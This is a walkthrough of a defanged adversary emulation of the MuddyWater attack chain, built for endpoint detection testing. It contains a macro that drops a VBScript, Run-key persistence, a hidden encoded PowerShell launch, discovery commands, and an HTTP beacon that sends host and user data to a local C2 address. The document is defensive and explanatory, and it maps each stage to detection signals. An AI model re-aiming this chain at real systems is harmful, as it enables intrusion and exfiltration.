# MuddyCalc — Full Attack Chain Walkthrough

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

Final payload: calc.exe (safe, benign)
C2: Local network only (hardcoded private IP: 192.168.0.148)
============================================================================
```

## Attack Overview

MuddyCalc emulates the MuddyWater (MERCURY / Mango Sandstorm) attack chain as documented in CISA AA22-055A. The chain follows MuddyWater's signature pattern: macro-enabled document → dropped script → persistence → PowerShell backdoor → system discovery → C2 beacon.

## Stage 0: Delivery

**MITRE:** T1566.001 — Phishing: Spearphishing Attachment

In a real MuddyWater campaign, the attack begins with a spearphishing email containing a macro-enabled document. The email typically:
- Impersonates a government agency, vendor, or internal department
- Uses urgent or routine business language (invoices, reports, policy updates)
- Attaches a macro-enabled document (.xlsm, .docm) as the primary payload

**Our emulation:** The spreadsheet (`Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsm`) is served from the MacBook's HTTP server at `192.168.0.148:8888`. The target downloads it via PowerShell `Invoke-WebRequest`.

```
MacBook (192.168.0.148)                    Windows VM
       │                                        │
       │  python3 -m http.server 8888           │
       │  (serving muddycalc/ directory)        │
       │                                        │
       │◄─── GET /Q4_...xlsm ──────────────────│
       │                                        │
       │──── .xlsm file ──────────────────────►│
       │                                        │
```

## Stage 1: Macro Execution

**MITRE:** T1204.002 — User Execution: Malicious File
**MITRE:** T1059.005 — Command and Scripting Interpreter: Visual Basic

When the user opens the spreadsheet in LibreOffice Calc (with macro security set to Low), the `Workbook_Open()` macro fires automatically.

**What the macro does:**

```
Workbook_Open()
│
├── [1] Create COM objects
│       Set wsh = CreateObject("WScript.Shell")
│       Set fso = CreateObject("Scripting.FileSystemObject")
│
├── [2] Resolve %TEMP% path
│       tempDir = wsh.ExpandEnvironmentStrings("%TEMP%")
│
├── [3] Construct VBScript line-by-line
│       fso.CreateTextFile(tempDir & "\update_check.vbs")
│       scriptFile.WriteLine "..."   ← Each line written individually
│       scriptFile.WriteLine "..."      (mirrors MuddyWater dynamic construction)
│       ...
│       scriptFile.Close
│
└── [4] Execute dropped VBScript
        wsh.Run "wscript.exe " & vbsPath, 0, False
```

**Process tree at this point:**
```
soffice.exe
  └── soffice.bin
        └── wscript.exe %TEMP%\update_check.vbs
```

**Detection signals:**
- File write: `.vbs` file created in `%TEMP%`
- Process creation: `soffice.bin` → `wscript.exe` (Office process spawning scripting engine)
- Command line: `wscript.exe` with path to `.vbs` file in temp directory

## Stage 2: VBScript Persistence + PowerShell Launch

**MITRE:** T1547.001 — Boot/Logon Autostart Execution: Registry Run Keys
**MITRE:** T1059.001 — Command and Scripting Interpreter: PowerShell

The dropped VBScript performs two actions:

### 2a. Registry Persistence

```vbs
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateCheck", "calc.exe", "REG_SZ"
```

Creates a Run key entry that survives reboot. **SAFETY:** The value is `calc.exe`, not the backdoor. Real MuddyWater would point this to a loader script or DLL.

**Detection signals:**
- Registry modification: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateCheck` created
- Registry value: `calc.exe` (REG_SZ)

### 2b. PowerShell Launch

```vbs
wsh.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -encodedcommand " & encodedCmd, 0, False
```

Launches PowerShell with the base64-encoded POWERSTATS emulation. The `-WindowStyle Hidden` flag hides the PowerShell window (standard MuddyWater behavior).

**Process tree at this point:**
```
soffice.exe
  └── soffice.bin
        └── wscript.exe %TEMP%\update_check.vbs
              └── powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
```

**Detection signals:**
- Process creation: `wscript.exe` → `powershell.exe` (scripting engine spawning PowerShell)
- Command line: `-encodedcommand` with base64 string
- Command line: `-WindowStyle Hidden` and `-ExecutionPolicy Bypass` flags

## Stage 3: POWERSTATS Discovery + C2 Beacon

**MITRE:** T1497.003, T1033, T1082, T1016, T1057, T1069.002, T1083, T1071.001

### 3a. Anti-Analysis Delay

```powershell
Start-Sleep -Seconds 3
```

Real POWERSTATS performs WMI sandbox detection queries. We simplify to a sleep.

### 3b. Discovery Burst

Each command runs via `cmd.exe /c` to create visible child processes:

```
powershell.exe
  ├── cmd.exe /c whoami                                    ← T1033
  ├── cmd.exe /c systeminfo                                ← T1082
  ├── cmd.exe /c ipconfig /all                             ← T1016
  ├── cmd.exe /c tasklist                                  ← T1057
  ├── cmd.exe /c net group "Domain Admins" /domain         ← T1069.002
  └── cmd.exe /c dir %USERPROFILE%\Documents               ← T1083
```

**Why cmd.exe /c?** Each command creates a separate child process that endpoint telemetry should capture. Running native PowerShell cmdlets would execute within the PowerShell process and be invisible to process-tree monitoring.

**Detection signals:**
- Process creation: Multiple `cmd.exe` children of `powershell.exe`
- Command lines: `whoami`, `systeminfo`, `ipconfig /all`, `tasklist`, `net group`, `dir`
- Process relationships: All share the same parent `powershell.exe` PID

### 3c. C2 Beacon

```powershell
$C2_URL = "http://192.168.0.148:8888/beacon"
$beacon = @{ hostname=...; username=...; pid=...; stage=...; discovery=... } | ConvertTo-Json
Invoke-WebRequest -Uri $C2_URL -Method POST -Body $beacon -ContentType "application/json"
```

**Detection signals:**
- Network: HTTP POST to `192.168.0.148:8888/beacon`
- Content: JSON body with hostname, username, PID, and discovery results
- Process context: Network connection from `powershell.exe`

### 3d. Final Payload

```powershell
Start-Process "calc.exe"
```

**SAFE:** In real POWERSTATS, this is where the operator deploys additional tools (credential dumpers, lateral movement utilities). We launch calc.exe.

**Full process tree at completion:**
```
soffice.exe
  └── soffice.bin
        └── wscript.exe %TEMP%\update_check.vbs
              └── powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
                    ├── cmd.exe /c whoami
                    ├── cmd.exe /c systeminfo
                    ├── cmd.exe /c ipconfig /all
                    ├── cmd.exe /c tasklist
                    ├── cmd.exe /c net group "Domain Admins" /domain
                    ├── cmd.exe /c dir %USERPROFILE%\Documents
                    └── calc.exe
```

## Comparison to Real MuddyWater

| Stage | Real MuddyWater | MuddyCalc |
|-------|----------------|-----------|
| Delivery | Spearphishing email with attachment | HTTP download from local server |
| Macro | Base52/base64 encoded payload, obfuscated | Plaintext VBScript construction |
| Dropped file | .dll + .reg or .inf files | Single .vbs file |
| Persistence | Run key pointing to backdoor | Run key pointing to calc.exe (safe) |
| Backdoor | POWERSTATS with multi-layer obfuscation | Plain PowerShell with single base64 layer |
| C2 | HTTPS to compromised web servers / cloud | HTTP POST to local server |
| Post-exploitation | Mimikatz, LaZagne, lateral movement | calc.exe |
